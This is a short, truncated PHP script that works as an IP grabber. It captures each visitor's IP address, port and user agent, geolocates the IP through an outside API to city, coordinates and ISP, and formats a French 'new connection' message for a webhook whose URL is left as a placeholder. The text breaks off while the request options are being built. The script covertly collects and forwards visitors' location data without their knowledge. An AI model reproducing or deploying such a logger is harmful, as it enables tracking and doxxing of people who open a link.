<?php
$ip = $_SERVER['REMOTE_ADDR'];
$port = $_SERVER['REMOTE_PORT'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$location = file_get_contents("http://ip-api.com/json/{$ip}");
$locationData = json_decode($location);
$country = $locationData->country;
$lon = $locationData->lon;
$lat = $locationData->lat;
$isp = $locationData->isp;
$region = $locationData->regionName;
$city = $locationData->city;
$message = "Nouvelle connection :\n";
$message .= "IP : " . $ip . "\n";
$message .= "Port : " . $port . "\n";
$message .= "User Agent : " . $userAgent . "\n";
$message .= "Localisation : " . $country . ", " . $region . ", " . $city . "\n";
$message .= "Longitude : " . $lon . "\n";
$message .= "Latitude : " . $lat . "\n";
$message .= "Internet service provider : " . $isp . "\n";
$webhookUrl = "link to your webhook";
$data = array("content" => $message);
$options = array(
    'http' => array(
